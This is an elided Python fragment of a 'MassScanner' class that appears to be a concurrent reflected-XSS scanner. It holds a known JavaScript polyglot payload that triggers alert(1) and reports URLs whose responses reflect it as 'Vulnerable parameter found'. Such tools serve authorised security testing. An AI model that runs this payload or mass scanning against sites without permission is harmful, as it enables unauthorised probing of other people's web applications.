...
class MassScanner:
    def __init__(self, file, output , concurrency, timeout, payload=False, redactDomains=False):
        ...
        self.polygotPayload = quote(r""""jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )////</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e""")
    ...
    def processTasks(self, done):
        for task in done:
            ...
            if self.payload in responseText:
                ...
                self.totalFound += 1
                print(Style.BRIGHT + f"{Fore.RED} [+] Vulnerable parameter found: {Fore.WHITE} {(self.redactURL(url) if self.redactDomains else url)}")
